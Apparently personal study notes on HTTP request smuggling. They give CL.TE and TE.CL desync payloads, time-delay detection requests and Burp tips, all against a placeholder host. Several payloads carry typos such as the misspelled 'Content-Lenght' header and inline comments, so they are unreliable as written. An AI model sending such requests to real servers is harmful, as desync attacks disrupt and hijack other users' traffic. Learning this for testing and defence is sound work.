# REQUEST SMUGGLING

[EXAMPLE REPORT](REQUEST%20SMUGGLING%20f9843d63454f4b50bbe6705db530b773/EXAMPLE%20REPORT%20cf91a037a48143ddb3e1fd345a51900f.md)

### **CL . TE**

**The front-end check length and the back-end check the encoding**

```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Lenght: [X]
Transfer-Encoding: chunked 

0 #End of the chuked request

GPOST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13

pwny=rock
```

In the front-end this is a single request acourding the lenght but in the back-end this is two requests acording the encoding 0 terminating the request in the middle

```
If the request work the response request of the server will be:
"Unrecognized method GPOST"
```

## **TE . CL**

**The front-end check the encoding and the back-end check the length** 

**Is essentialy inverted CL . TE**

```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 3 #One space + two characters (3F)
Transfer-Encoding: chunked

5c #The number of bytes of the second request in hex number (92=>5c)
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15 #One space +tree characters (x=1) + the end of request (0)

x=1
0 #End of the chuked request
```

You need to count the quantity of bytes in the second request and convert into hex number

In the burp you can select the second request and click on "Convert to chunked" and cautomaticaly will put the hexadecimal length and the 0 end request.

And add the header methods clicking in the first request and in "change the request method"

# **Identify With Time Delay**

## **CL . TE**

```bash
CL . TE
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

- The **front-end** will pass by one request on legth: **1 space + 2 chars + 1 number = 4 bytes**
- The **back-end** will not terminate the chunk and will whait for the next it cause a time delay

## **TE . CL**

```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

- The **front-end** will recieve part of the chuked request
- The **back-end** will expected **6 bytes** on the resquest (more than the sended) and will **whait the rest of the bytes** and it cause a time delay

**ALERT: The timing-based test fot TE. CL vulnerabilities disturb** the application for other users **use this test only if the CL. TE not work**

## **Confirming HTTP Smuggling**

An attack request want to interfere in the next request

But you can confirm this wihout circumvent the legal laws checking the responde of your request

**A Normal Request:**

```bash
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
